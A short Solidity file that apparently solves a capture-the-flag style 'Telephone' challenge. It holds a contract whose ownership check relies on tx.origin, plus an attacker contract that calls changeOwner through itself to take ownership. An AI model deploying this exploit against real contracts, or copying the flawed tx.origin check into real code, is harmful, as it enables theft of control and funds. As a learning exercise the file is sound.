pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneAttacker {
    Telephone w;

    constructor(address t) public {
        w = Telephone(t);
    }

    function attack(address _a) public {
        w.changeOwner(_a);
    }
}
